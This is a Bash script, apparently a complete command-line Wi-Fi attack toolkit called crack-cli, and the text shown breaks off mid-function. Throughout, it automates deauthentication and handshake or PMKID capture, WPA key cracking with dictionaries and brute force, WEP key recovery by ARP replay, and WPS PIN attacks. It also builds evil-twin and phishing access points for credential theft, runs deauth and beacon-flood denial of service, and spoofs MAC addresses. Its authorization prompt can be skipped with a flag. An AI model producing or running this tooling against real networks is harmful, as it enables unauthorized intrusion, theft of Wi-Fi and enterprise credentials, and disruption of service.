#!/usr/bin/env bash
#
# crack-cli.sh — complete command-line Wi-Fi security auditing toolkit.
# Authorized use only: audit networks you own or have written permission to test.
#
set -u -o pipefail

ORIG_ARGS=("$@")
WORDLIST="/usr/share/wordlists/rockyou.txt"
IFACE=""
MON=""
ASSUME_YES=0
WORKDIR=""
NM_STOPPED=0
CAP=""
LAST_HASH=""
PICK=0
REPLY_IDX=0
REPLY_STR=""
SEL_BSSID=""; SEL_CH=""; SEL_ENC=""; SEL_ESSID=""
declare -a B_BSSID B_CH B_ENC B_ESSID B_PWR

declare -A PKG=(
  [airmon-ng]=aircrack-ng [airodump-ng]=aircrack-ng [aireplay-ng]=aircrack-ng
  [aircrack-ng]=aircrack-ng [airbase-ng]=aircrack-ng [besside-ng]=aircrack-ng
  [wesside-ng]=aircrack-ng [wpaclean]=aircrack-ng [packetforge-ng]=aircrack-ng
  [iw]=iw [rfkill]=rfkill [macchanger]=macchanger [ip]=iproute2
  [reaver]=reaver [wash]=reaver [bully]=bully [pixiewps]=pixiewps
  [hashcat]=hashcat [john]=john [cowpatty]=cowpatty [genpmk]=cowpatty
  [crunch]=crunch [wpapcap2john]=john
  [hcxdumptool]=hcxdumptool [hcxpcapngtool]=hcxtools [hcxpcaptool]=hcxtools
  [wifite]=wifite [hostapd]=hostapd [hostapd-wpe]=hostapd-wpe [dnsmasq]=dnsmasq
  [eaphammer]=eaphammer [wifiphisher]=wifiphisher [fluxion]=fluxion
  [airgeddon]=airgeddon [bettercap]=bettercap [kismet]=kismet
  [mdk4]=mdk4 [mdk3]=mdk3 [asleap]=asleap [tshark]=tshark [nmcli]=network-manager
)

if [[ -t 1 ]]; then
  R=$'\e[0m'; B=$'\e[1m'; DIM=$'\e[2m'
  RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; BLU=$'\e[34m'; CYA=$'\e[36m'
else
  R=''; B=''; DIM=''; RED=''; GRN=''; YEL=''; BLU=''; CYA=''
fi
say()   { printf '%s\n' "$*"; }
info()  { printf '%s\n' "${CYA}[*]${R} $*"; }
ok()    { printf '%s\n' "${GRN}[+]${R} $*"; }
warn()  { printf '%s\n' "${YEL}[!]${R} $*"; }
err()   { printf '%s\n' "${RED}[x]${R} $*" >&2; }
head_() { printf '\n%s\n' "${B}${BLU}==>${R} ${B}$*${R}"; }
have()  { command -v "$1" >/dev/null 2>&1; }

usage() {
  cat <<EOF
crack-cli — complete command-line Wi-Fi security auditing toolkit

Usage: sudo ./crack-cli.sh [options]

  --iface <dev>     Wireless interface (e.g. wlan0). Autodetected if omitted.
  --wordlist <f>    Default dictionary (default: $WORDLIST).
  -y, --yes         Skip the authorization prompt.
  -h, --help        Show this help.

Covers: recon, WPA/WPA2 handshake + PMKID capture, cracking with
aircrack-ng / hashcat / john / cowpatty, the full WEP arsenal, WPS
(reaver / bully / pixiewps), evil-twin / WPA-Enterprise, and the
frameworks (wifite, airgeddon, fluxion, bettercap, kismet, mdk4).
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface) IFACE="${2:?}"; shift 2 ;;
    --wordlist) WORDLIST="${2:?}"; shift 2 ;;
    -y|--yes) ASSUME_YES=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) err "Unknown option: $1"; usage; exit 1 ;;
  esac
done

ask_choice() {
  local prompt="$1"; shift
  local opts=("$@") i sel
  printf '\n%s\n' "${B}${prompt}${R}"
  for i in "${!opts[@]}"; do
    printf '  %s%2d)%s %s\n' "$CYA" "$((i + 1))" "$R" "${opts[$i]}"
  done
  while true; do
    if ! read -r -p "Select [1-${#opts[@]}]: " sel; then
      echo; err "No input available — aborting."; exit 1
    fi
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#opts[@]} )); then
      REPLY_IDX=$sel; return 0
    fi
    warn "Enter a number between 1 and ${#opts[@]}."
  done
}

ask_str() {
  local prompt="$1" def="${2:-}" p="$1"
  [[ -n "$def" ]] && p="$prompt [$def]"
  if ! read -r -p "$p: " REPLY_STR; then err "Aborted."; return 1; fi
  [[ -z "$REPLY_STR" ]] && REPLY_STR="$def"
  return 0
}

confirm() { ask_choice "$1" "Yes" "No"; [[ $REPLY_IDX -eq 1 ]]; }

need_tool() {
  local t="$1"
  have "$t" && return 0
  local pkg="${PKG[$t]:-$t}"
  err "Required tool '$t' is not installed."
  local opts=()
  have apt-get && opts+=("Install '$pkg' with apt now")
  opts+=("Retry (I installed it myself)" "Cancel")
  ask_choice "How would you like to proceed?" "${opts[@]}"
  case "${opts[$((REPLY_IDX - 1))]}" in
    Install*) apt-get update -y; apt-get install -y "$pkg"; have "$t" && return 0; err "'$t' still missing."; return 1 ;;
    Retry*) need_tool "$t" ;;
    Cancel) return 1 ;;
  esac
}

hcx_convert() { if have hcxpcapngtool; then hcxpcapngtool "$@"; elif have hcxpcaptool; then hcxpcaptool "$@"; else return 127; fi; }

cleanup() {
  local code=$?
  echo
  if [[ -n "$MON" ]] && iw dev 2>/dev/null | grep -q "$MON"; then
    airmon-ng stop "$MON" >/dev/null 2>&1 && ok "Disabled monitor mode ($MON)."
  fi
  if (( NM_STOPPED )); then
    for c in "systemctl restart NetworkManager" "service NetworkManager restart" "service network-manager restart"; do
      $c >/dev/null 2>&1 && break
    done
  fi
  [[ -n "$WORKDIR" && -d "$WORKDIR" ]] && rm -rf "$WORKDIR"
  exit "$code"
}
trap cleanup EXIT INT TERM

authorize() {
  say "${YEL}${B}Authorized use only.${R}${YEL} Audit networks you own or have written permission to test.${R}"
  (( ASSUME_YES )) && return 0
  local a
  read -r -p "Type 'I AGREE' to continue: " a || { err "Aborted."; exit 1; }
  [[ "$a" == "I AGREE" ]] || { err "Not authorized. Exiting."; exit 1; }
}

require_root() {
  [[ "$(id -u)" -eq 0 ]] && return 0
  warn "Most Wi-Fi operations (monitor mode, capture, injection) need root."
  ask_choice "How would you like to proceed?" "Re-run with sudo now" "Continue without root (cracking from files only)" "Exit"
  case $REPLY_IDX in
    1) exec sudo -- "$0" "${ORIG_ARGS[@]}" ;;
    2) return 0 ;;
    3) exit 1 ;;
  esac
}

select_interface() {
  [[ -n "$IFACE" ]] && { info "Using interface $IFACE."; return 0; }
  local list
  mapfile -t list < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
  if (( ${#list[@]} == 0 )); then
    err "No wireless interface detected."
    ask_choice "How would you like to proceed?" "Enter interface name manually" "Unblock with rfkill and retry" "Retry detection" "Cancel"
    case $REPLY_IDX in
      1) ask_str "Interface name" || return 1; IFACE="$REPLY_STR" ;;
      2) have rfkill && rfkill unblock wifi; select_interface ;;
      3) select_interface ;;
      4) return 1 ;;
    esac
    return
  fi
  if (( ${#list[@]} == 1 )); then IFACE="${list[0]}"; info "Using interface $IFACE."; return; fi
  ask_choice "Select the wireless interface:" "${list[@]}"
  IFACE="${list[$((REPLY_IDX - 1))]}"
}

start_monitor() {
  need_tool airmon-ng || return 1
  head_ "Enabling monitor mode on $IFACE"
  airmon-ng check kill >/dev/null 2>&1
  NM_STOPPED=1
  airmon-ng start "$IFACE" >/dev/null 2>&1
  MON="$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon$' | head -1)"
  [[ -z "$MON" ]] && iw dev 2>/dev/null | grep -q "${IFACE}mon" && MON="${IFACE}mon"
  if [[ -z "$MON" ]] || ! iw dev 2>/dev/null | grep -q "$MON"; then
    err "Could not enable monitor mode on $IFACE (the adapter may not support it)."
    ask_choice "How would you like to proceed?" "Choose a different interface" "Retry" "Cancel"
    case $REPLY_IDX in
      1) IFACE=""; select_interface && start_monitor ;;
      2) start_monitor ;;
      3) return 1 ;;
    esac
    return
  fi
  ok "Monitor interface: $MON"
}

stop_monitor() {
  [[ -n "$MON" ]] || { warn "No monitor interface active."; return; }
  airmon-ng stop "$MON" >/dev/null 2>&1; ok "Stopped $MON."
  MON=""
  for c in "systemctl restart NetworkManager" "service NetworkManager restart" "service network-manager restart"; do
    $c >/dev/null 2>&1 && break
  done
  NM_STOPPED=0
}

ensure_monitor_ready() { [[ -n "$MON" ]] && return 0; select_interface && start_monitor; }

parse_networks() {
  awk -F',' '
    /Station MAC/ { exit }
    $1 ~ /([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ {
      bssid=$1; ch=$4; priv=$6; pow=$9; essid=$14;
      gsub(/[ \r]/, "", bssid); gsub(/[ \r]/, "", ch); gsub(/[ \r]/, "", pow);
      up=toupper(priv);
      if (up ~ /WPA3/ && up !~ /WPA2/) enc="WPA3";
      else if (up ~ /WPA/) enc="WPA2";
      else if (up ~ /WEP/) enc="WEP";
      else enc="OPEN";
      sub(/^ /, "", essid); gsub(/\r/, "", essid);
      if (essid == "") essid="(hidden)";
      printf "%s\t%s\t%s\t%s\t%s\n", bssid, ch, pow, enc, essid;
    }' "$1" | sort -t$'\t' -k3,3nr
}

scan_and_pick() {
  ensure_monitor_ready || return 1
  local dur=12
  while true; do
    head_ "Scanning for networks (~${dur}s)…"
    local prefix="$WORKDIR/scan"
    rm -f "$prefix"*.csv 2>/dev/null
    timeout "$dur" airodump-ng --output-format csv -w "$prefix" "$MON" >/dev/null 2>&1
    local csv; csv="$(ls -t "$prefix"*.csv 2>/dev/null | head -1)"

    B_BSSID=(); B_CH=(); B_PWR=(); B_ENC=(); B_ESSID=()
    if [[ -n "$csv" ]]; then
      local bssid ch pwr enc essid
      while IFS=$'\t' read -r bssid ch pwr enc essid; do
        [[ -z "$bssid" ]] && continue
        B_BSSID+=("$bssid"); B_CH+=("$ch"); B_PWR+=("$pwr"); B_ENC+=("$enc"); B_ESSID+=("$essid")
      done < <(parse_networks "$csv")
    fi

    if (( ${#B_BSSID[@]} == 0 )); then
      err "No networks found."
      ask_choice "How would you like to proceed?" "Scan again" "Scan longer (30s)" "Cancel"
      case $REPLY_IDX in 1) dur=12; continue ;; 2) dur=30; continue ;; 3) return 1 ;; esac
    fi

    printf '\n%s\n' "${B}   #   SIGNAL   CH   ENC     SSID${R}"
    local i
    for i in "${!B_BSSID[@]}"; do
      printf '  %2d   %5sdBm  %3s  %-6s  %s\n' \
        "$((i + 1))" "${B_PWR[$i]}" "${B_CH[$i]}" "${B_ENC[$i]}" "${B_ESSID[$i]}"
    done

    local sel
    while true; do
      read -r -p $'\nSelect a network [number], (r)escan, (c)ancel: ' sel || return 1
      case "$sel" in
        r|R) dur=12; break ;;
        c|C|q|Q) return 1 ;;
        *)
          if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#B_BSSID[@]} )); then
            PICK=$((sel - 1)); return 0
          fi
          warn "Invalid selection." ;;
      esac
    done
  done
}

select_target() {
  scan_and_pick || return 1
  SEL_BSSID="${B_BSSID[$PICK]}"; SEL_CH="${B_CH[$PICK]}"
  SEL_ENC="${B_ENC[$PICK]}"; SEL_ESSID="${B_ESSID[$PICK]}"
  return 0
}

ensure_wordlist() {
  [[ -f "$WORDLIST" ]] && return 0
  if [[ -f "${WORDLIST}.gz" ]]; then
    info "Extracting ${WORDLIST}.gz…"; gunzip -k "${WORDLIST}.gz" && return 0
  fi
  err "Wordlist not found: $WORDLIST"
  ask_choice "How would you like to proceed?" "Enter a different path" "Download an online wordlist" "Cancel"
  case $REPLY_IDX in
    1) ask_str "Path to wordlist" || return 1; WORDLIST="$REPLY_STR"; ensure_wordlist ;;
    2) pick_online_wordlist ;;
    3) return 1 ;;
  esac
}

pick_online_wordlist() {
  ask_choice "Choose an online wordlist to download:" \
    "Top 10k passwords (SecLists, small)" \
    "Top 100k passwords (SecLists)" \
    "Top 1M passwords (SecLists)" \
    "rockyou.txt (~130 MB)" \
    "Cancel"
  local url
  case $REPLY_IDX in
    1) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" ;;
    2) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
    3) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" ;;
    4) url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" ;;
    5) return 1 ;;
  esac
  local dest="$WORKDIR/${url##*/}"
  info "Downloading ${url##*/}…"
  if have curl; then curl -fL --progress-bar "$url" -o "$dest"
  elif have wget; then wget -q --show-progress "$url" -O "$dest"
  else err "Neither curl nor wget is available."; return 1; fi
  [[ -s "$dest" ]] && { WORDLIST="$dest"; ok "Saved to $dest."; return 0; }
  err "Download failed."; return 1
}

extract_key() { sed -n 's/.*KEY FOUND! \[ \(.*\) \].*/\1/p' | head -1; }

ensure_handshake() {
  local bssid="$1" ch="$2" essid="$3" dur="${4:-90}"
  need_tool airodump-ng || return 1
  local prefix="$WORKDIR/hs_${bssid//:/}"
  local existing; existing="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
  if [[ -n "$existing" ]] && aircrack-ng "$existing" 2>/dev/null | grep -qi "1 handshake"; then
    ok "Reusing the handshake captured earlier this session."
    CAP="$existing"; return 0
  fi
  rm -f "$prefix"*.cap 2>/dev/null
  info "Capturing the 4-way handshake on channel $ch (deauthing to force a reconnect)…"
  airodump-ng -c "$ch" --bssid "$bssid" -w "$prefix" --output-format cap "$MON" >/dev/null 2>&1 &
  local dump=$! end=$((SECONDS + dur)) got=1 cap
  while (( SECONDS < end )); do
    aireplay-ng --deauth 5 -a "$bssid" "$MON" >/dev/null 2>&1
    sleep 4
    cap="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
    if [[ -n "$cap" ]] && aircrack-ng "$cap" 2>/dev/null | grep -qi "1 handshake"; then got=0; CAP="$cap"; break; fi
    printf '.'
  done
  echo
  kill "$dump" 2>/dev/null; wait "$dump" 2>/dev/null
  if (( got != 0 )); then
    err "No handshake captured for $essid."
    ask_choice "How would you like to proceed?" \
      "Retry capture (longer, 180s)" \
      "Retry and wait for a client (240s)" \
      "Pick a different network" \
      "Abort"
    case $REPLY_IDX in
      1) ensure_handshake "$bssid" "$ch" "$essid" 180; return $? ;;
      2) ensure_handshake "$bssid" "$ch" "$essid" 240; return $? ;;
      3) return 2 ;;
      4) return 1 ;;
    esac
  fi
  ok "Handshake captured: $CAP"
  return 0
}

crack_dict_on_cap() {
  local bssid="$1" essid="$2"
  ensure_wordlist || return 1
  info "Dictionary attack with $(basename "$WORDLIST")…"
  local key; key="$(aircrack-ng -b "$bssid" -w "$WORDLIST" "$CAP" 2>/dev/null | extract_key)"
  [[ -n "$key" ]] && { show_success "$essid" "$key"; return 0; }
  err "Key not found with $(basename "$WORDLIST")."
  ask_choice "How would you like to proceed?" \
    "Try a different wordlist" "Download an online wordlist" \
    "Try bruteforce (crunch)" "Try hashcat (GPU)" "Give up on this network"
  case $REPLY_IDX in
    1) ask_str "Path to wordlist" || return 1; WORDLIST="$REPLY_STR"; crack_dict_on_cap "$bssid" "$essid" ;;
    2) pick_online_wordlist && crack_dict_on_cap "$bssid" "$essid" || return 1 ;;
    3) crack_brute_on_cap "$bssid" "$essid" ;;
    4) local h="$WORKDIR/${bssid//:/}.22000"; hcx_convert -o "$h" "$CAP" >/dev/null 2>&1 && { LAST_HASH="$h"; crack_hashcat "$h"; } || err "Conversion needs hcxtools." ;;
    5) return 1 ;;
  esac
}

crack_brute_on_cap() {
  local bssid="$1" essid="$2"
  need_tool crunch || return 1
  ask_choice "Bruteforce charset:" "Digits (0-9)" "Lowercase (a-z)" "Alphanumeric" "Custom"
  local cs
  case $REPLY_IDX in
    1) cs="0123456789" ;;
    2) cs="abcdefghijklmnopqrstuvwxyz" ;;
    3) cs="abcdefghijklmnopqrstuvwxyz0123456789" ;;
    4) ask_str "Charset" "0123456789" || return 1; cs="$REPLY_STR" ;;
  esac
  local len; ask_str "Password length" "8"; [[ "$REPLY_STR" =~ ^[0-9]+$ ]] && len="$REPLY_STR" || len=8
  warn "The keyspace grows fast — this can take a very long time. Ctrl+C to stop."
  local key; key="$(crunch "$len" "$len" "$cs" 2>/dev/null | aircrack-ng -b "$bssid" -w - "$CAP" 2>/dev/null | extract_key)"
  [[ -n "$key" ]] && { show_success "$essid" "$key"; return 0; }
  err "Key not found in that keyspace."
  ask_choice "How would you like to proceed?" "Different charset/length" "Try a wordlist" "Give up on this network"
  case $REPLY_IDX in
    1) crack_brute_on_cap "$bssid" "$essid" ;;
    2) crack_dict_on_cap "$bssid" "$essid" ;;
    3) return 1 ;;
  esac
}

crack_hashcat() {
  need_tool hashcat || return 1
  local hf="${1:-}"
  [[ -z "$hf" ]] && { ask_str "hashcat hash file (.22000)" "$LAST_HASH" || return 1; hf="$REPLY_STR"; }
  [[ -f "$hf" ]] || { err "File not found: $hf"; return 1; }
  ask_choice "hashcat attack:" "Wordlist (-a 0)" "Wordlist + rules" "Mask bruteforce (-a 3)" "Back"
  case $REPLY_IDX in
    1) ensure_wordlist || return 1; hashcat -m 22000 -a 0 "$hf" "$WORDLIST" ;;
    2) ensure_wordlist || return 1; ask_str "Rules file" "/usr/share/hashcat/rules/best64.rule"; hashcat -m 22000 -a 0 "$hf" "$WORDLIST" -r "$REPLY_STR" ;;
    3) ask_str "Mask" "?d?d?d?d?d?d?d?d"; hashcat -m 22000 -a 3 "$hf" "$REPLY_STR" ;;
    4) return 0 ;;
  esac
  say "--- recovered ---"; hashcat -m 22000 "$hf" --show 2>/dev/null
}

crack_john() {
  need_tool john || return 1
  ask_str "Input .cap/.pcapng path" "$CAP" || return 1
  local in="$REPLY_STR" jf="$WORKDIR/hs.john"
  if have wpapcap2john; then wpapcap2john "$in" > "$jf"
  elif hcx_convert -j "$jf" "$in" 2>/dev/null; then :
  else err "Need wpapcap2john (john) or hcxtools to build the john hash."; return 1; fi
  ensure_wordlist || return 1
  john --wordlist="$WORDLIST" "$jf"
  say "--- recovered ---"; john --show "$jf" 2>/dev/null
}

crack_cowpatty() {
  need_tool cowpatty || return 1
  ask_str "Handshake .cap path" "$CAP" || return 1; local in="$REPLY_STR"
  ask_str "SSID" || return 1; local ss="$REPLY_STR"
  ask_choice "cowpatty mode:" "Dictionary" "Precomputed rainbow (genpmk)" "Back"
  case $REPLY_IDX in
    1) ensure_wordlist || return 1; cowpatty -r "$in" -f "$WORDLIST" -s "$ss" ;;
    2) need_tool genpmk || return 1; ensure_wordlist || return 1
       genpmk -f "$WORDLIST" -d "$WORKDIR/pmk-$ss" -s "$ss"
       cowpatty -r "$in" -d "$WORKDIR/pmk-$ss" -s "$ss" ;;
    3) return 0 ;;
  esac
}

capture_pmkid() {
  ensure_monitor_ready || return 1
  need_tool hcxdumptool || return 1
  local out="$WORKDIR/pmkid-$$.pcapng"
  info "Capturing PMKID + handshakes with hcxdumptool. Press Ctrl+C to stop."
  hcxdumptool -i "$MON" -w "$out" --enable_status=1
  [[ -s "$out" ]] || { warn "Nothing captured."; return 1; }
  ok "Saved capture: $out"
  local hash="${out%.pcapng}.22000"
  if hcx_convert -o "$hash" "$out" >/dev/null 2>&1; then
    LAST_HASH="$hash"
    ok "hashcat file: $hash"
    confirm "Crack it now with hashcat?" && crack_hashcat "$hash"
  else
    warn "Install hcxtools to convert to a hashcat file (hcxpcapngtool)."
  fi
}

menu_recon() {
  ensure_monitor_ready || return
  ask_choice "Recon & scanning:" \
    "airodump-ng — live network scan" \
    "wash — list WPS-enabled APs" \
    "hcxdumptool — passive scan (PMKID-capable APs)" \
    "kismet — full detector" \
    "bettercap — interactive wifi recon" \
    "Back"
  case $REPLY_IDX in
    1) info "Press Ctrl+C to stop."; airodump-ng "$MON" ;;
    2) need_tool wash && { info "Ctrl+C to stop."; wash -i "$MON"; } ;;
    3) need_tool hcxdumptool && { info "Ctrl+C to stop."; hcxdumptool -i "$MON" --rcascan; } ;;
    4) need_tool kismet && kismet -c "$MON" ;;
    5) need_tool bettercap && bettercap -iface "$IFACE" -eval "wifi.recon on; sleep 20; wifi.show; q" ;;
    6) return ;;
  esac
}

menu_capture() {
  ask_choice "Capture:" \
    "WPA/WPA2 handshake (guided: scan → deauth → capture)" \
    "PMKID (hcxdumptool, clientless) → hashcat file" \
    "besside-ng — automated WPA/WEP capture" \
    "Convert a .cap/.pcapng to hashcat 22000" \
    "Clean a capture (wpaclean)" \
    "Back"
  case $REPLY_IDX in
    1) select_target || return; ensure_handshake "$SEL_BSSID" "$SEL_CH" "$SEL_ESSID" ;;
    2) capture_pmkid ;;
    3) ensure_monitor_ready && need_tool besside-ng && { ask_str "ESSID filter (blank = all)"; [[ -n "$REPLY_STR" ]] && besside-ng -R "$REPLY_STR" "$MON" || besside-ng "$MON"; } ;;
    4) need_tool hcxpcapngtool; ask_str "Input .cap/.pcapng path" || return; local out="$WORKDIR/$(basename "${REPLY_STR%.*}").22000"; hcx_convert -o "$out" "$REPLY_STR" && { ok "hashcat file: $out"; LAST_HASH="$out"; } ;;
    5) need_tool wpaclean && { ask_str "Input .cap path" || return; local o="$WORKDIR/clean-$(basename "$REPLY_STR")"; wpaclean "$o" "$REPLY_STR" && ok "Clean cap: $o"; } ;;
    6) return ;;
  esac
}

menu_crack() {
  ask_choice "Crack a capture:" \
    "aircrack-ng — dictionary / bruteforce (.cap)" \
    "hashcat — GPU (mode 22000: wordlist / rules / mask)" \
    "john the ripper — wordlist" \
    "cowpatty — dictionary or precomputed" \
    "Back"
  case $REPLY_IDX in
    1) ask_str "Handshake .cap path" "$CAP" || return; CAP="$REPLY_STR"; ask_str "Target BSSID" || return; local bs="$REPLY_STR"
       ask_choice "Mode:" "Dictionary" "Bruteforce" "Back"
       case $REPLY_IDX in 1) crack_dict_on_cap "$bs" "target" ;; 2) crack_brute_on_cap "$bs" "target" ;; 3) : ;; esac ;;
    2) crack_hashcat ;;
    3) crack_john ;;
    4) crack_cowpatty ;;
    5) return ;;
  esac
}

attack_wep() {
  local bssid="$1" ch="$2" essid="$3"
  need_tool airodump-ng || return 1
  local prefix="$WORKDIR/wep_${bssid//:/}"
  rm -f "$prefix"*.cap 2>/dev/null
  info "Collecting WEP IVs on channel $ch (with ARP-replay injection)…"
  airodump-ng -c "$ch" --bssid "$bssid" -w "$prefix" --output-format cap "$MON" >/dev/null 2>&1 &
  local dump=$!
  aireplay-ng -1 0 -a "$bssid" "$MON" >/dev/null 2>&1
  aireplay-ng --arpreplay -b "$bssid" "$MON" >/dev/null 2>&1 &
  local replay=$! key="" end=$((SECONDS + 300)) cap
  while (( SECONDS < end )); do
    sleep 6
    cap="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
    [[ -z "$cap" ]] && { printf '.'; continue; }
    key="$(aircrack-ng -b "$bssid" "$cap" 2>/dev/null | extract_key | tr -d ':')"
    [[ -n "$key" ]] && break
    printf '.'
  done
  echo
  kill "$dump" "$replay" 2>/dev/null; wait "$dump" "$replay" 2>/dev/null
  [[ -n "$key" ]] && { show_success "$essid" "$key"; return 0; }
  err "Could not recover the WEP key (not enough IVs)."
  ask_choice "How would you like to proceed?" "Retry (collect longer)" "Pick a different network" "Abort"
  case $REPLY_IDX in 1) attack_wep "$bssid" "$ch" "$essid" ;; 2) return 1 ;; 3) return 1 ;; esac
}

menu_wep() {
  ensure_monitor_ready || return
  ask_choice "WEP attacks:" \
    "Guided auto (fake-auth + ARP replay + aircrack)" \
    "wesside-ng — fully automatic" \
    "ChopChop keystream (aireplay -4)" \
    "Fragmentation keystream (aireplay -5)" \
    "Fake authentication only (aireplay -1)" \
    "Crack an existing .cap (aircrack-ng)" \
    "Back"
  case $REPLY_IDX in
    1) select_target || return; attack_wep "$SEL_BSSID" "$SEL_CH" "$SEL_ESSID" ;;
    2) need_tool wesside-ng && { select_target || return; wesside-ng -i "$MON" -v "$SEL_BSSID"; } ;;
    3) select_target || return; aireplay-ng -1 0 -a "$SEL_BSSID" "$MON"; aireplay-ng -4 -b "$SEL_BSSID" "$MON" ;;
    4) select_target || return; aireplay-ng -1 0 -a "$SEL_BSSID" "$MON"; aireplay-ng -5 -b "$SEL_BSSID" "$MON" ;;
    5) select_target || return; aireplay-ng -1 0 -a "$SEL_BSSID" "$MON" ;;
    6) ask_str ".cap path" || return; local c="$REPLY_STR"; ask_str "BSSID" || return; aircrack-ng -b "$REPLY_STR" "$c" ;;
    7) return ;;
  esac
}

menu_wps() {
  ensure_monitor_ready || return
  ask_choice "WPS attacks:" \
    "wash — scan for WPS-enabled APs" \
    "reaver — Pixie-Dust (offline PIN, fast)" \
    "reaver — online PIN bruteforce" \
    "bully — Pixie-Dust / PIN" \
    "pixiewps — offline PIN computation (advanced)" \
    "Back"
  case $REPLY_IDX in
    1) need_tool wash && { info "Ctrl+C to stop."; wash -i "$MON"; } ;;
    2) need_tool reaver && { select_target || return; reaver -i "$MON" -b "$SEL_BSSID" -c "$SEL_CH" -K 1 -N -vv; } ;;
    3) need_tool reaver && { select_target || return; ask_str "Delay between attempts (sec)" "1"; reaver -i "$MON" -b "$SEL_BSSID" -c "$SEL_CH" -vv -d "$REPLY_STR"; } ;;
    4) need_tool bully && { select_target || return; ask_choice "bully mode:" "Pixie-Dust" "PIN bruteforce"; if [[ $REPLY_IDX -eq 1 ]]; then bully -b "$SEL_BSSID" -c "$SEL_CH" -d "$MON"; else bully -b "$SEL_BSSID" -c "$SEL_CH" "$MON"; fi; } ;;
    5) need_tool pixiewps && { info "pixiewps is used automatically by 'reaver -K 1'. For manual use, supply the WPS values captured by 'reaver -vvv':"; pixiewps --help 2>&1 | head -25; } ;;
    6) return ;;
  esac
}

menu_eviltwin() {
  warn "Rogue-AP / enterprise / phishing modules — for AUTHORIZED engagements only."
  ask_choice "Evil twin / rogue AP / WPA-Enterprise:" \
    "airbase-ng — basic fake AP" \
    "eaphammer — evil twin / PMKID / enterprise creds / hostile portal" \
    "hostapd-wpe — WPA-Enterprise credential capture" \
    "wifiphisher — automated phishing framework" \
    "fluxion — evil twin + handshake verification" \
    "Back"
  case $REPLY_IDX in
    1) ensure_monitor_ready || return; ask_str "Fake AP ESSID" "Free WiFi" || return; local e="$REPLY_STR"; ask_str "Channel" "6"; airbase-ng -e "$e" -c "$REPLY_STR" "$MON" ;;
    2) need_tool eaphammer && { confirm "Generate a certificate first (--cert-wizard)?" && eaphammer --cert-wizard; info "Launching eaphammer — use its flags for evil-twin / --pmkid / enterprise."; eaphammer --help 2>&1 | head -40; ask_str "eaphammer arguments (e.g. -i $MON --essid Corp --creds)"; [[ -n "$REPLY_STR" ]] && eaphammer $REPLY_STR; } ;;
    3) need_tool hostapd-wpe && { local cfg="/etc/hostapd-wpe/hostapd-wpe.conf"; [[ -f "$cfg" ]] || ask_str "Path to hostapd-wpe.conf" "$cfg" && cfg="$REPLY_STR"; hostapd-wpe "$cfg"; } ;;
    4) need_tool wifiphisher && wifiphisher -i "$IFACE" ;;
    5) need_tool fluxion && fluxion ;;
    6) return ;;
  esac
}

menu_frameworks() {
  ask_choice "Automated frameworks:" \
    "wifite — automated WEP/WPS/WPA/PMKID" \
    "airgeddon — all-in-one menu" \
    "fluxion — evil twin suite" \
    "bettercap — interactive engine" \
    "kismet — detector/logger" \
    "mdk4 — deauth / beacon-flood / stress toolkit" \
    "Back"
  case $REPLY_IDX in
    1) need_tool wifite && { ask_str "Extra wifite flags (e.g. --wpa --pmkid --dict $WORDLIST)"; wifite $REPLY_STR; } ;;
    2) need_tool airgeddon && airgeddon ;;
    3) need_tool fluxion && fluxion ;;
    4) need_tool bettercap && bettercap -iface "$IFACE" ;;
    5) ensure_monitor_ready || return; need_tool kismet && kismet -c "$MON" ;;
    6) ensure_monitor_ready || return; need_tool mdk4 && { ask_choice "mdk4 mode:" "Deauth (d)" "Beacon flood (b)" "Auth DoS (a)" "Back"; case $REPLY_IDX in 1) mdk4 "$MON" d ;; 2) mdk4 "$MON" b ;; 3) mdk4 "$MON" a ;; 4) : ;; esac; } ;;
    7) return ;;
  esac
}

menu_utils() {
  ask_choice "Utilities:" \
    "Start monitor mode" "Stop monitor mode" "Set channel" \
    "MAC address (macchanger)" "rfkill: unblock Wi-Fi" \
    "Show tool availability" "Install the full toolkit (apt)" \
    "Set default wordlist" "Back"
  case $REPLY_IDX in
    1) select_interface && start_monitor ;;
    2) stop_monitor ;;
    3) [[ -z "$MON" ]] && { warn "No monitor interface active."; return; }; ask_str "Channel" "6" || return; iw dev "$MON" set channel "$REPLY_STR" && ok "Channel set to $REPLY_STR." ;;
    4) util_mac ;;
    5) need_tool rfkill && { rfkill unblock wifi && ok "Wi-Fi unblocked."; } ;;
    6) list_tools ;;
    7) install_all ;;
    8) ask_str "Wordlist path" "$WORDLIST" || return; WORDLIST="$REPLY_STR"; ok "Default wordlist: $WORDLIST" ;;
    9) return ;;
  esac
}

util_mac() {
  local dev="${MON:-$IFACE}"
  [[ -z "$dev" ]] && { select_interface || return; dev="$IFACE"; }
  need_tool macchanger || return
  ask_choice "MAC for $dev:" "Random MAC" "Specific MAC" "Reset to permanent" "Back"
  local flag=""
  case $REPLY_IDX in
    1) flag="-r" ;;
    2) ask_str "MAC (aa:bb:cc:dd:ee:ff)" || return; flag="-m $REPLY_STR" ;;
    3) flag="-p" ;;
    4) return ;;
  esac
  ip link set "$dev" down 2>/dev/null
  macchanger $flag "$dev"
  ip link set "$dev" up 2>/dev/null
}

list_tools() {
  head_ "Tool availability"
  local t
  for t in "${!PKG[@]}"; do
    if have "$t"; then printf '  %sok  %-14s%s\n' "$GRN" "$t" "$R"
    else printf '  %s--  %-14s%s  (apt: %s)\n' "$RED" "$t" "$R" "${PKG[$t]}"; fi
  done | sort -k2
}

install_all() {
  have apt-get || { err "apt-get not available on this system."; return 1; }
  local pkgs; pkgs="$(printf '%s\n' "${PKG[@]}" | sort -u)"
